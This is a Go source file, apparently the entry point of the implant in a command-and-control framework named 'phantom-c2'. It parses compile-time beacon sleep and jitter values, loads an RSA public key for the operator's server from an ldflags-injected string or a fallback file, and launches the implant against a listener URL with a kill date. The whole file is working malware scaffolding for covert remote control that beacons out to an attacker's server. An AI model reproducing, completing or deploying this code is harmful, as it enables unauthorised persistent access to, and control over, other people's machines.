package main

import (
	"crypto/rsa"
	"strconv"

	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/implant"
)

func main() {
	// Parse compile-time config
	sleepSec, _ := strconv.Atoi(implant.SleepSeconds)
	if sleepSec <= 0 {
		sleepSec = 10
	}

	jitterPct, _ := strconv.Atoi(implant.JitterPercent)
	if jitterPct < 0 || jitterPct > 50 {
		jitterPct = 20
	}

	// Load server public key
	var serverPubKey *rsa.PublicKey

	// Try base64-encoded key (injected at compile time via -ldflags)
	if implant.ServerPubKey != "" {
		keyBytes, err := crypto.Base64Decode(implant.ServerPubKey)
		if err == nil {
			pub, err := crypto.PublicKeyFromBytes(keyBytes)
			if err == nil {
				serverPubKey = pub
			}
		}
	}

	// Fallback: load from file (development mode only)
	if serverPubKey == nil {
		pub, err := crypto.LoadPublicKey("configs/server.pub")
		if err == nil {
			serverPubKey = pub
		}
	}

	if serverPubKey == nil {
		return // No key — cannot communicate
	}

	// Run the implant
	implant.Run(
		implant.ListenerURL,
		serverPubKey,
		sleepSec,
		jitterPct,
		implant.KillDate,
	)
}
